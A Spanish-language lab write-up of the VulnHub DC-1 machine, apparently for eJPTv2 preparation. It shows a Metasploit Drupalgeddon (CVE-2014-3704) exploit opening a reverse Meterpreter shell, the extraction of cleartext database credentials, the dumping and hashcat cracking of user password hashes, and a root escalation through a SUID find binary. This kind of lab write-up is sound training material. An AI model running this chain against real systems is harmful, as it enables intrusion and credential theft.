DC-1 es una máquina Linux Easy de **VulnHub** (otra de mi laboratorio autohospedado de preparación del eJPTv2), construida en torno a un **Drupal 7** desactualizado. El foothold es el famoso RCE por inyección SQL **Drupalgeddon** (**CVE-2014-3704**) para una shell de `www-data`. Desde ahí la máquina es un recorrido guiado de post-explotación: el fichero de configuración de Drupal filtra la contraseña de la base de datos, la tabla `users` entrega hashes de contraseña que **hashcat** crackea, y el login de admin revela la pista de escalada de privilegios — un binario **SUID `find`** que cae directamente a `root` vía GTFOBins. Las flags en sí son pistas deliberadas, así que he redactado su texto y he descrito hacia dónde apunta cada una.

## Acceso Inicial — CVE-2014-3704 (Drupalgeddon) como `www-data`

El módulo `drupal_drupageddon` de Metasploit automatiza toda la cadena: abusa de la SQLi para inyectar en la caché de formularios de Drupal y ejecutar un payload PHP. Los valores por defecto encajan (puerto 80, URI `/`); solo necesita el objetivo y un listener:

```bash
msf6 > use exploit/multi/http/drupal_drupageddon
msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.57.4
msf6 exploit(multi/http/drupal_drupageddon) > set LHOST 192.168.57.1
msf6 exploit(multi/http/drupal_drupageddon) > run
```

```bash
[*] Started reverse TCP handler on 192.168.57.1:4444
[*] Sending stage (45739 bytes) to 192.168.57.4
[*] Meterpreter session 1 opened (192.168.57.1:4444 -> 192.168.57.4:59448)

meterpreter > getuid
Server username: www-data
```

Una shell de `www-data`. El webroot ya contiene **flag1**, que — sin citarla — es un empujón directo hacia el fichero de configuración de Drupal. Esa es la siguiente parada.

## Botín — Credenciales de Config y Crackeo de Hashes

### El fichero de configuración de Drupal

Drupal guarda sus ajustes (incluidas las credenciales de base de datos, en texto claro) en `sites/default/settings.php`. También contiene **flag2**, cuyo comentario apunta a *usar* esas credenciales en vez de fuerza-brutear nada:

```bash
www-data@DC-1:/var/www/sites/default$ cat settings.php
```

```php
$databases = array('default' => array('default' => array(
  'database' => 'drupaldb',
  'username' => 'dbuser',
  'password' => 'R0ck3t',
  'driver'   => 'mysql',
)));
```

Así que el login de base de datos es **`dbuser:R0ck3t`**.

### Volcar y crackear los hashes de usuario

MySQL escucha solo en localhost (`127.0.0.1:3306`), pero ya estamos en la máquina. Leer la tabla `users` vuelca los hashes de contraseña almacenados de Drupal para `admin` y `Fred`:

```bash
mysql -u dbuser -p'R0ck3t' drupaldb -e "select name,pass from users"
```

```bash
admin  $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
Fred   $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg
```

El prefijo `$S$` es el esquema de hashing de Drupal 7 — modo hashcat **7900**. Contra `rockyou`, ambos caen rápido:

```bash
hashcat -m 7900 hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
$S$DvQI6Y...:53cr3t
$S$DWGrx...:MyPassword
```

Eso da **`admin:53cr3t`** y **`Fred:MyPassword`**. Entrar en Drupal como `admin` revela **flag3** en el contenido del sitio, que (de nuevo, parafraseado) marca el camino a la escalada de privilegios: un binario SUID y el truco de `-exec` para leer ficheros protegidos.

## Escalada de Privilegios — `www-data` → `root` (SUID `find`)

Siguiendo esa pista, una búsqueda de binarios SUID confirma el vector:

```bash
www-data@DC-1:/$ find / -perm -4000 2>/dev/null
/bin/mount
/bin/su
/usr/bin/passwd
...
/usr/bin/find
```

**`/usr/bin/find` lleva el bit SUID** — se ejecuta como su propietario, `root`. `find` puede ejecutar comandos arbitrarios con `-exec`, así que un `find` SUID es una shell de root directa. Esta es la técnica exacta de [GTFOBins](https://gtfobins.github.io/gtfobins/find/): `find` lanza `/bin/sh`, que hereda los privilegios de root de `find`:

```bash
www-data@DC-1:/$ find . -exec /bin/sh \; -quit
# whoami
root
# cat /root/thefinalflag.txt
REDACTED
```

Root completo, y la flag final. (También hay un `flag4` en `/home/flag4/` cuya pista anticipa exactamente este paso de SUID-`find`-a-root.)

## Conclusiones Clave

- **Una versión de CMS sin parchear es todo el foothold.** `droopescan` situó Drupal en el rango 7.22–7.26, que mapea directamente a Drupalgeddon (CVE-2014-3704). Hacer fingerprint de la versión exacta suele ser toda la decisión de explotación en una máquina con CMS.
- **Los ficheros de configuración son almacenes de credenciales.** `settings.php` entregó `dbuser:R0ck3t` en texto claro — y esa contraseña desbloqueó la base de datos, los hashes de usuario y, en última instancia, la cuenta de admin de Drupal. Tras cualquier foothold web, lee la configuración de la aplicación antes de nada más pesado.
- **Acierta el esquema del hash.** El prefijo `$S$` es Drupal 7 (hashcat 7900); elegir el modo correcto es la diferencia entre un crackeo de 10 segundos y un callejón sin salida. `admin:53cr3t` cayó al instante contra rockyou.
- **SUID en `find` es una shell de root instantánea.** `find` con `-exec` ejecuta comandos arbitrarios, así que el bit SUID hace de `find . -exec /bin/sh \; -quit` una escalada de una línea. Audita los binarios SUID (`find / -perm -4000`) y quita el bit de todo lo que pueda ejecutar comandos.
- **Lee las propias pistas del reto.** Las flags de DC-1 son un camino guiado — fichero de config → credenciales → hashes → SUID find. Incluso en un objetivo real, la ruta prevista por el autor refleja una metodología sensata: enumerar, saquear la configuración, escalar vía mala configuración.
